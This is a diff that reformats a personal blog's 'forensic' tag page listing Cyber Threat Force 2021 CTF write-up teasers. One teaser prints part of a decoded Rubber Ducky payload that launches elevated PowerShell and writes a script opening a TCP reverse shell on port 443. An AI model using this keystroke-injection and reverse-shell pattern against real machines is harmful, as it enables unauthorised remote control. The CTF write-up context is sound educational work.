@@ -1,18 +1,145 @@
-<!doctype html><html lang=en><head><title>forensic :: Nicolas Bourras</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://nicolasb.fr/tags/forensic/><link rel=stylesheet href=https://nicolasb.fr/assets/style.css><link rel=stylesheet href=https://nicolasb.fr/assets/pink.css><link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="website"><meta property="og:title" content="forensic"><meta property="og:description" content><meta property="og:url" content="https://nicolasb.fr/tags/forensic/"><meta property="og:site_name" content="Nicolas Bourras"><meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><link href=/tags/forensic/index.xml rel=alternate type=application/rss+xml title="Nicolas Bourras"></head><body class=pink><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Nicolas Bourras</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About</a></li><li><a href=/>Posts</a></li><li><a href=/recipes>Recipes</a></li></ul></nav></header><div class=content><div class=posts><div class="post on-list"><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/>Writeup Cyber Threat Force : Like a duck in water</a></h1><div class=post-meta><span class=post-date>2021-07-11</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+<!doctype html><html lang=en>
+<head>
+<title>forensic :: Nicolas Bourras</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content>
+<meta name=keywords content>
+<meta name=robots content="noodp">
+<link rel=canonical href=https://nicolasb.fr/tags/forensic/>
+<link rel=stylesheet href=https://nicolasb.fr/assets/style.css>
+<link rel=stylesheet href=https://nicolasb.fr/assets/pink.css>
+<link rel=apple-touch-icon href=https://nicolasb.fr/img/apple-touch-icon-192x192.png>
+<link rel="shortcut icon" href=https://nicolasb.fr/img/favicon/pink.png>
+<meta name=twitter:card content="summary">
+<meta name=twitter:creator content>
+<meta property="og:locale" content="en">
+<meta property="og:type" content="website">
+<meta property="og:title" content="forensic">
+<meta property="og:description" content>
+<meta property="og:url" content="https://nicolasb.fr/tags/forensic/">
+<meta property="og:site_name" content="Nicolas Bourras">
+<meta property="og:image" content="https://nicolasb.fr/img/favicon/pink.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+<link href=/tags/forensic/index.xml rel=alternate type=application/rss+xml title="Nicolas Bourras">
+</head>
+<body class=pink>
+<div class="container center">
+<header class=header>
+<div class=header__inner>
+<div class=header__logo>
+<a href=/>
+<div class=logo>
+Nicolas Bourras
+</div>
+</a>
+</div>
+<div class=menu-trigger>menu</div>
+</div>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about>About</a></li>
+<li><a href=/>Posts</a></li>
+<li><a href=/recipes>Recipes</a></li>
+</ul>
+</nav>
+</header>
+<div class=content>
+<div class=posts>
+<div class="post on-list">
+<h1 class=post-title>
+<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/>Writeup Cyber Threat Force : Like a duck in water</a>
+</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-11
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;</span><div class=post-content>Note: I did not solve this challenge during the CTF, but my teammate Lukho did.
+#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;
+</span>
+<div class=post-content>
+Note: I did not solve this challenge during the CTF, but my teammate Lukho did.
 For this challenge, we were given an inject.bin file, which contains an encoded Rubber Ducky payload. We can use the Duck Toolkit to get back the original code:
-DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER DELAY mDELAY DOWNARROW ... DOWNARROW ENTER $folderDateTime = (get-date).ToString('d-M-y HHmmss')ENTER ... Add-Content "$env:TEMP\72794.ps1" '$c = New-Object System.Net.Sockets.TCPClient("CYBERTF{D0N4LD_DUC|&lt;}",443);$s = $c.</div><div><a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/>Read more →</a></div></div><div class="post on-list"><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/>Writeup Cyber Threat Force : Usb key cemetery</a></h1><div class=post-meta><span class=post-date>2021-07-11</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+DELAY DELAY powershell Start-Process notepad -Verb runAsENTER DELAY DELAY ENTER DELAY mDELAY DOWNARROW ... DOWNARROW ENTER $folderDateTime = (get-date).ToString('d-M-y HHmmss')ENTER ... Add-Content "$env:TEMP\72794.ps1" '$c = New-Object System.Net.Sockets.TCPClient("CYBERTF{D0N4LD_DUC|&lt;}",443);$s = $c.
+</div>
+<div>
+<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-like-a-duck-in-water/>Read more →</a>
+</div>
+</div>
+<div class="post on-list">
+<h1 class=post-title>
+<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/>Writeup Cyber Threat Force : Usb key cemetery</a>
+</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-11
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;</span><div class=post-content>Note: I did not solve this challenge during the CTF, but my teammate Volker did.
+#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;
+</span>
+<div class=post-content>
+Note: I did not solve this challenge during the CTF, but my teammate Volker did.
 For this challenge, we were given a zip containing an encoded syslog (sysloc.enc), and an auth.json file:
-{ "manufact": [ "Apple Inc.", "Azurewave", "Generic", "Linux 5.10.0-kali8-amd64 xhci-hcd", "usbrip-4381" ], "pid": [ "0002", "0003", "0129", "0608", "12a8", "3491", "56dd", "usbrip-4381" ], "prod": [ "USB2.0 HD UVC WebCam", "USB2.0 Hub", "USB2.0-CRW", "iPhone", "usbrip-4381", "xHCI Host Controller" ], "serial": [ "0000:03:00.</div><div><a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/>Read more →</a></div></div><div class="post on-list"><h1 class=post-title><a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/>Writeup Cyber Threat Force : Welcome to the matrix</a></h1><div class=post-meta><span class=post-date>2021-07-09</span></div><span class=post-tags>#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
+{ "manufact": [ "Apple Inc.", "Azurewave", "Generic", "Linux 5.10.0-kali8-amd64 xhci-hcd", "usbrip-4381" ], "pid": [ "0002", "0003", "0129", "0608", "12a8", "3491", "56dd", "usbrip-4381" ], "prod": [ "USB2.0 HD UVC WebCam", "USB2.0 Hub", "USB2.0-CRW", "iPhone", "usbrip-4381", "xHCI Host Controller" ], "serial": [ "0000:03:00.
+</div>
+<div>
+<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-usb-key-cemetery/>Read more →</a>
+</div>
+</div>
+<div class="post on-list">
+<h1 class=post-title>
+<a href=https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/>Writeup Cyber Threat Force : Welcome to the matrix</a>
+</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-09
+</span>
+</div>
+<span class=post-tags>
+#<a href=https://nicolasb.fr/tags/blog/>blog</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/security/>security</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/ctf/>ctf</a>&nbsp;
 #<a href=https://nicolasb.fr/tags/cyber-threat-force/>cyber-threat-force</a>&nbsp;
-#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;</span><div class=post-content></div><div><a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/>Read more →</a></div></div><div class=pagination><div class=pagination__buttons></div></div></div></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
-<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://nicolasb.fr/assets/main.js></script><script src=https://nicolasb.fr/assets/prism.js></script></div></body></html>
+#<a href=https://nicolasb.fr/tags/forensic/>forensic</a>&nbsp;
+</span>
+<div class=post-content>
+</div>
+<div>
+<a class="read-more button" href=/blog/writeup-cyber-threat-force-2021-forensic-welcome-to-the-matrix/>Read more →</a>
+</div>
+</div>
+<div class=pagination>
+<div class=pagination__buttons>
+</div>
+</div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=copyright>
+<span>© 2021 Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span>
+</div>
+</div>
+</footer>
+<script src=https://nicolasb.fr/assets/main.js></script>
+<script src=https://nicolasb.fr/assets/prism.js></script>
+</div>
+</body>
+</html>
